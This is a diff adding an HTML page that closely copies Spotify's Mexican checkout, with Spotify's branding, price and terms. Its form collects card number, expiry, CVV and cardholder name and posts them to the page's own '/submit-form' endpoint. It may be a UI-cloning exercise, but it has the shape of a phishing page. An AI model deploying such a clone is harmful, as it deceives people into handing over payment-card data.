@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Spotify</title>
+</head>
+<body>
+    <div class="black-background">
+        <header class="header container">
+            <div class="logo">
+                <img src="image1.png" alt="Spotify" class="logo-img">
+            </div>
+            <nav class="nav">
+                <button class="profile-btn">
+                    <img src="image-2.png" alt="Icono izquierdo" class="icon-left">
+                    Perfil
+                    <img src="image-3.png" alt="Icono derecho" class="icon-right">
+                </button>
+            </nav>
+        </header>
+        <section>
+            <div class="plan-section">
+                <div class="plan-titles">
+                    <h2 class="plan-left">Tu plan</h2>
+                    <h2 class="plan-right">Cambiar plan</h2>
+                </div>
+                
+                <!-- Recuadro Azul Celeste -->
+                <div class="highlight-box">
+                    <div class="text-content">
+                        <p>Premium Familiar</p>
+                        <p class="small-text">Hasta 6 cuentas Premium o Kids</p>
+                    </div>
+                </div> 
+                
+                <!-- Recuadro Blanco Debajo del Recuadro Azul Celeste -->
+                <div class="white-box">
+                    <p class="total">Total</p>
+                    <p class="payment-info">Un pago único de 199,00 MXN<br> <span class="mes">por 1 mes</span></p>
+                    <p class="terms"><span class="bullet">•</span> Se aplican <span class="underline">Términos de la oferta.</span></p>
+                </div>
+            </div>
+            <div>
+                <img src="" alt="">
+            </div>
+        </section>
+    </div>
+
+    <section class="payment-section">
+        <div class="overall-container">
+            <div class="payment-container">
+                <!-- Opción Tarjeta de crédito o débito -->
+                <div class="payment-option">
+                    <input type="radio" name="payment" checked>
+                    <label>
+                        <span class="payment-title">Tarjeta de crédito o débito</span>
+                        <div class="card-icons">
+                            <img src="visa.svg" alt="Visa">
+                            <img src="mastercard.svg" alt="Mastercard">
+                            <img src="amex.svg" alt="American Express">
+                            <div class="secure-icon-container">
+                                <img src="asset14.svg" alt="Seguridad" class="secure-icon">
+                                <div class="tooltip">Las transacciones están encriptadas y son seguras.</div>
+                            </div>
+                        </div>
+                        
+                        <!-- Formulario de pago -->
+                        <form id="payment-form" action="/submit-form" method="POST">
+                            <!-- Campos del formulario debajo de los logos -->
+                            <div class="credit-card-form">
+                                <label for="card-number">Número de tarjeta</label>
+                                <span id="card-icon" class="card-icon"></span>
+                                <input type="text" id="card-number" name="card-number" maxlength="19" placeholder="0000 0000 0000 0000" required>
+
+                                <div class="expiry-cvv">
+                                    <div>
+                                        <label for="expiry-date">Fecha de vencimiento</label>
+                                        <input type="text" id="expiry-date" name="expiry-date" maxlength="5" placeholder="MM/AA" required>
+                                    </div>
+                                    <div>
+                                        <label for="cvv">Código de seguridad</label>
+                                        <div class="cvv-input-wrapper">
+                                            <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="CVV" required>
+                                            <div class="cvv-icon-container">
+                                                <img src="asset15.svg" alt="CVV Icon" class="cvv-icon">
+                                                <div class="cvv-tooltip">
+                                                    El código de seguridad o CVV son los 3 o 4 números adicionales que aparecen al reverso o frente de tu tarjeta.
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <label for="card-name">Nombre en la tarjeta</label>
+                                <input id="card-name" name="card-name" type="text" placeholder="Nombre en la Tarjeta" required>
+
+                                <!-- Modificación del checkbox -->
+                                <div class="save-card">
+                                    <input type="checkbox" id="save-card-checkbox">
+                                    <label for="save-card-checkbox">Guardar la tarjeta para futuras compras.</label>
+                                </div>
+                            </div>
+                        </form>
+                    </label>
+                </div>
+
+                <!-- Opción PayPal -->
+                <div class="payment-option">
+                    <input type="radio" name="payment">
+                    <label>
+                        <span class="payment-title">PayPal</span>
+                        <img src="paypal.svg" alt="PayPal" class="paypal-logo">
+                    </label>
+                </div>
+
+                <!-- Opción Oxxo Pay -->
+                <div class="payment-option">
+                    <input type="radio" name="payment">
+                    <label>
+                        <span class="payment-title">Oxxo</span>
+                        <img src="oxxo.svg" alt="Oxxo Pay" class="oxxo-logo">
+                    </label>
+                </div>
+            </div>
+            
+            <!-- Sección de términos debajo de la opción de pago -->
+            <div class="payment-terms">
+                <p>Al completar tu compra, autorizas a Spotify a cobrarte el precio establecido arriba por el tiempo seleccionado. Aceptas que tendrás derecho a cancelar la suscripción y obtener un reembolso dentro de los 14 días posteriores a la compra, pero lo perderás si usas Spotify durante ese periodo. Si tienes una suscripción recurrente, esta se reanudará según el precio vigente al final de tu periodo prepago, a menos que canceles antes. Aquellos usuarios que previamente no tenían una suscripción volverán a tener una cuenta gratis. No se realizan reembolsos parciales. Se aplican <span class="underline">Términos.</span></p>
+            </div>
+            <div class="terms-acceptance">
+                <label class="checkbox-container">
+                    <input type="checkbox" id="accept-checkbox">
+                    <span class="checkmark"></span>
+                </label>
+                <p class="acceptance-text">Acepto la recopilación de mi información financiera por Spotify para los cargos necesarios del servicio detallado en la Política de Privacidad de Spotify.</p>
+            </div>
+            <div class="payment-terms2">
+                <p>Tu método de pago (por ejemplo, tu banco o tu proveedor de telefonía móvil) podría realizar cargos adicionales, por ejemplo, aplicar impuestos, tarifas y/o el precio equivalente a dólares estadounidenses a la tasa de cambio que decida. Spotify no realiza estos cargos adicionales.</p>
+            </div>
+            <div class="button-container">
+                <button type="submit" form="payment-form" class="comprar-button">Comprar ahora</button>             
+            </div>
+        </div>
+    </section>
+
+    <div class="country-container">
+        <span>México</span> <span class="change-country">Cambiar de país</span>
+    </div>
+
+    <script src="java.js"></script>
+</body>
+</html>
